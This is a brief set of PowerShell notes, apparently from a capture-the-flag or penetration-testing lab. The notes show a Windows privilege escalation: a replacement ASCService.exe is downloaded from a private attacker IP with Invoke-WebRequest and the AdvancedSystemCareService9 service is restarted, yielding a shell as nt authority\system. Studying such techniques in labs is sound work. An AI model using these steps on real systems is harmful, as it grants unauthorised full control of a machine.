# PowerShell

## Checking Services
```
get-service AdvancedSystemCareService9
stop-service AdvancedSystemCareService9
start-service AdvancedSystemCareService9

powershell -c get-service AdvancedSystemCareService9
powershell -c stop-service AdvancedSystemCareService9
powershell -c start-service AdvancedSystemCareService9
```

## Invoke-WebRequest
```
c:/> Invoke-WebRequest "http://10.2.3.85/ASCService.exe" -OutFile "ASCService.exe"
c:/> powershell -c Invoke-WebRequest "http://10.2.3.85/ASCService.exe" -OutFile "ASCService.exe"
c:/> powershell -c start-service AdvancedSystemCareService9

WOOTWOOT
c:\Windows\system32>whoami
nt authority\system
```
